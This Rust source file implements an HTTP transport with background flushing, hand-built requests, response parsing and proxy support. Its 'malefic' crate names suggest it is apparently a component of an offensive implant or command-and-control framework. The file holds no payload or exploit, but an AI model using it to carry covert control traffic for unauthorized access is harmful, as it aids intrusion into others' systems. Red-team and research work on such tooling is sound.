use crate::tcp::{new_steam, TCPTransport};
use crate::{DialerExt, TransportError};
use anyhow::Result;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{AsyncRead, AsyncWrite, AsyncWriteExt};
use malefic_common::debug;
use malefic_common::spawn;
use malefic_config::{ServerConfig, TransportConfig};
use std::io;
use std::io::{Cursor, Read};
use std::pin::Pin;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::task::{Context, Poll, Waker};

#[cfg(feature = "proxy")]
use crate::proxie::{AsyncProxy, Auth, HTTPProxy, Proxy, SOCKS5Proxy};
#[cfg(feature = "proxy")]
use malefic_config::{PROXY_HOST, PROXY_PASSWORD, PROXY_PORT, PROXY_USERNAME};

#[derive(Clone)]
pub struct HTTPTransport {
    config: ServerConfig,
    inner: Arc<Mutex<Option<TCPTransport>>>,
    send_buffer: Arc<Mutex<Vec<u8>>>,
    recv_buffer: Arc<Mutex<Cursor<Vec<u8>>>>,
    flush_requested: Arc<AtomicBool>,
    read_waker: Arc<Mutex<Option<Waker>>>,
    connection_error: Arc<Mutex<Option<TransportError>>>,
}

impl HTTPTransport {
    pub async fn new(server_config: ServerConfig) -> Result<Self> {
        let transport = HTTPTransport {
            config: server_config.clone(),
            inner: Arc::new(Mutex::new(None)),
            send_buffer: Arc::new(Mutex::new(Vec::new())),
            recv_buffer: Arc::new(Mutex::new(Cursor::new(Vec::new()))),
            flush_requested: Arc::new(AtomicBool::new(false)),
            read_waker: Arc::new(Mutex::new(None)),
            connection_error: Arc::new(Mutex::new(None)),
        };

        {
            let mut bg_transport = transport.clone();
            let flag = transport.flush_requested.clone();
            let flush_poll_interval = match &transport.config.transport_config {
                TransportConfig::Http(http_config) => http_config.flush_poll_interval,
                _ => std::time::Duration::from_millis(1),
            };
            spawn(async move {
                loop {
                    if flag.swap(false, Ordering::SeqCst) {
                        if let Err(e) = bg_transport.done().await {
                            debug!("[transport] Background task error: {:?}", e);
                        }
                    }
                    futures_timer::Delay::new(flush_poll_interval).await;
                }
            });
        }

        Ok(transport)
    }

    async fn read_chunk(&self, size: usize) -> Result<Vec<u8>> {
        let mut inner_guard = self.inner.lock().await;
        let transport = inner_guard.as_mut().unwrap();
        let mut chunk_buf = vec![0u8; size];
        let n = futures::AsyncReadExt::read(transport, &mut chunk_buf).await?;
        if n == 0 {
            return Err(TransportError::RecvError.into());
        }
        chunk_buf.truncate(n);
        Ok(chunk_buf)
    }

    async fn done(&mut self) -> Result<()> {
        let send_data = {
            let buffer = self.send_buffer.lock().await;
            buffer.clone()
        };
        self.do_request(send_data).await?;
        {
            let mut buffer = self.send_buffer.lock().await;
            buffer.clear();
        }
        debug!("[transport] HTTP request completed, data available for reading");
        Ok(())
    }

    async fn ensure_connection(&mut self) -> Result<()> {
        let mut inner_guard = self.inner.lock().await;
        if inner_guard.is_none() {
            let stream = new_steam(&self.config).await?;
            let transport = TCPTransport::new(stream, self.config.clone()).await?;
            *inner_guard = Some(transport);
            debug!("[transport] HTTP connection established");
        }
        Ok(())
    }

    async fn do_request(&mut self, data: Vec<u8>) -> Result<()> {
        match self.ensure_connection().await {
            Ok(_) => {
                if let Some(mut error_guard) = self.connection_error.try_lock() {
                    *error_guard = None;
                }
            }
            Err(e) => {
                debug!("[transport] HTTP connection failed: {:?}", e);
                if let Some(mut error_guard) = self.connection_error.try_lock() {
                    *error_guard = Some(TransportError::ConnectionRefused);
                    if let Some(mut waker_guard) = self.read_waker.try_lock() {
                        if let Some(waker) = waker_guard.take() {
                            waker.wake();
                        }
                    }
                }
                if let Some(mut recv_buffer) = self.recv_buffer.try_lock() {
                    recv_buffer.get_mut().clear();
                    recv_buffer.set_position(0);
                }
                return Err(e);
            }
        }
        debug!(
            "[transport] HTTP request starting, data length: {}",
            data.len()
        );
        let http_config = match &self.config.transport_config {
            TransportConfig::Http(http_config) => http_config.clone(),
            _ => return Err(TransportError::ConfigurationError.into()),
        };
        {
            let mut inner_guard = self.inner.lock().await;
            let transport = inner_guard.as_mut().unwrap();
            let http_request = http_config.build_request(data.len());
            let mut request_buffer = Vec::with_capacity(http_request.len() + 50 + data.len());
            request_buffer.extend_from_slice(http_request.as_bytes());
            request_buffer.extend_from_slice(&data);
            transport.write_all(&request_buffer).await?;
        }

        let mut buffer = Vec::with_capacity(1024);
        let (header_buf, body_prefix) = loop {
            let chunk = self
                .read_chunk(http_config.response_read_chunk_size.max(1))
                .await?;
            buffer.extend_from_slice(&chunk);
            if let Some(header_end_pos) = buffer
                .windows(4)
                .position(|window| window == b"\r\n\r\n")
                .map(|pos| pos + 4)
            {
                let (header_part, body_part) = buffer.split_at(header_end_pos);
                break (header_part.to_vec(), body_part.to_vec());
            }
            if buffer.len() > buffer.capacity() - 512 {
                buffer.reserve(1024);
            }
        };

        let mut headers = [httparse::EMPTY_HEADER; 16];
        let mut resp = httparse::Response::new(&mut headers);
        match resp.parse(&header_buf)? {
            httparse::Status::Complete(_) => {
                let content_length = resp
                    .headers
                    .iter()
                    .find(|h| h.name.eq_ignore_ascii_case("content-length"))
                    .and_then(|h| std::str::from_utf8(h.value).ok())
                    .and_then(|s| s.parse::<usize>().ok())
                    .unwrap_or(0);
                if content_length == 0 {
                    let mut buffer = self.recv_buffer.lock().await;
                    *buffer = Cursor::new(Vec::new());
                    return Ok(());
                }
                debug!("[transport] recv body expect:{}", content_length);
                self.read_response_body(content_length, body_prefix, &http_config)
                    .await
            }
            httparse::Status::Partial => Err(TransportError::RecvError.into()),
        }
    }

    async fn read_response_body(
        &mut self,
        expected_length: usize,
        body_prefix: Vec<u8>,
        http_config: &malefic_config::HttpRequestConfig,
    ) -> Result<()> {
        debug!(
            "[transport] starting to read response body, expected: {} bytes, prefix: {} bytes",
            expected_length,
            body_prefix.len()
        );
        {
            let mut buffer = self.recv_buffer.lock().await;
            if !body_prefix.is_empty() {
                *buffer = Cursor::new(body_prefix.clone());
                if let Some(waker) = self.read_waker.lock().await.take() {
                    waker.wake();
                }
            } else {
                *buffer = Cursor::new(Vec::with_capacity(expected_length));
            }
        }

        let mut remaining = expected_length.saturating_sub(body_prefix.len());
        while remaining > 0 {
            let chunk_size = remaining.min(http_config.response_read_chunk_size.max(1));
            let chunk = match self.read_chunk(chunk_size).await {
                Ok(chunk) => chunk,
                Err(_) => {
                    futures_timer::Delay::new(http_config.response_retry_delay).await;
                    continue;
                }
            };
            {
                let mut buffer = self.recv_buffer.lock().await;
                buffer.get_mut().extend_from_slice(&chunk);
                if let Some(waker) = self.read_waker.lock().await.take() {
                    waker.wake();
                }
            }
            remaining -= chunk.len();
        }
        debug!(
            "[transport] response body read complete, total: {} bytes",
            expected_length
        );
        Ok(())
    }
}

impl AsyncRead for HTTPTransport {
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut [u8],
    ) -> Poll<io::Result<usize>> {
        if let Some(mut error_guard) = self.connection_error.try_lock() {
            if let Some(transport_error) = error_guard.take() {
                return Poll::Ready(Err(io::Error::new(io::ErrorKind::Other, transport_error)));
            }
        }
        match self.recv_buffer.try_lock() {
            Some(mut cursor) => {
                let available = cursor.get_ref().len() - cursor.position() as usize;
                if available == 0 {
                    if let Some(mut waker_guard) = self.read_waker.try_lock() {
                        *waker_guard = Some(cx.waker().clone());
                    }
                    return Poll::Pending;
                }
                let read_len = available.min(buf.len());
                let n = cursor.read(&mut buf[..read_len]).unwrap_or(0);
                Poll::Ready(Ok(n))
            }
            None => {
                cx.waker().wake_by_ref();
                Poll::Pending
            }
        }
    }
}

impl AsyncWrite for HTTPTransport {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<io::Result<usize>> {
        match self.send_buffer.try_lock() {
            Some(mut buffer) => {
                buffer.extend_from_slice(buf);
                Poll::Ready(Ok(buf.len()))
            }
            None => {
                cx.waker().wake_by_ref();
                Poll::Pending
            }
        }
    }

    fn poll_flush(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        self.flush_requested.store(true, Ordering::SeqCst);
        Poll::Ready(Ok(()))
    }

    fn poll_close(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        self.flush_requested.store(true, Ordering::SeqCst);
        Poll::Ready(Ok(()))
    }
}

#[derive(Clone)]
pub struct HTTPClient;

impl HTTPClient {
    pub fn new() -> Result<Self> {
        Ok(HTTPClient)
    }

    pub fn new_with_alias(_alias: Option<&str>) -> Result<Self> {
        Self::new()
    }
}

#[async_trait]
impl DialerExt for HTTPClient {
    async fn connect(&mut self, target: &crate::server_manager::Target) -> Result<HTTPTransport> {
        let config = target.server_config();
        debug!(
            "[transport] Connecting to HTTP server at {}",
            config.address
        );
        HTTPTransport::new(config.clone()).await
    }
}
